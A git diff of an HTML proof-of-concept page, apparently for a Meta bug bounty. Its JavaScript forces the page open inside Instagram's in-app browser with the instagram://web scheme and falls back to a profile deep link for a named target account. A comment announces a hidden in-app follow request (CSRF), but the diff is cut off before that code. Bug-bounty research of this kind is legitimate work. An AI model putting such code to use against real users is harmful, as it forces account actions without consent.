@@ -2,24 +2,23 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Meta Bug Bounty - Aggressive Deep Link Test</title>
+    <title>Meta Bug Bounty - In-App Browser Attack (mehmet383570)</title>
     
     <script>
         const TARGET_USERNAME = "mehmet383570";
-        const INSTAGRAM_URI = "instagram://user?username=" + TARGET_USERNAME;
 
-        function triggerDeepLink() {
-            // 1. window.location kullanarak deneme
-            window.location.replace(INSTAGRAM_URI);
-
-            // 2. iframe kullanarak deneme (Eski Android/iOS sürümlerinde etkili olabilir)
-            setTimeout(function() {
-                let iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = INSTAGRAM_URI;
-                document.body.appendChild(iframe);
-            }, 50); 
+        function triggerFollowAction() {
+            // 1. Önce Instagram'ın kendi web şemasıyla kendi URL'mizi uygulamanın içinde açmaya zorlayalım.
+            const selfUrl = "https://mehmetkkk2828.github.io/"; 
+            const instagramWebUri = "instagram://web?url=" + encodeURIComponent(selfUrl);
             
-            // 3. Tarayıcının uyarı penceresi açılırsa yedek URL'e yönlendir
+            window.location.replace(instagramWebUri);
+
+            // 2. Eğer bu başarısız olursa, 500ms sonra doğrudan profil deep link'i denenir (Yedek)
             setTimeout(function() {
-                // Eğer uygulama açılmazsa, kullanıcıya manuel tıklama seçeneği sunulur
+                const profileUri = "instagram://user?username=" + TARGET_USERNAME;
+                window.location.replace(profileUri);
+            }, 500); 
+
+            // 3. (GİZLİ) Uygulama içinde JavaScript kullanarak takip isteği tetikleme (CSRF potansiyeli)
+            // Eğe
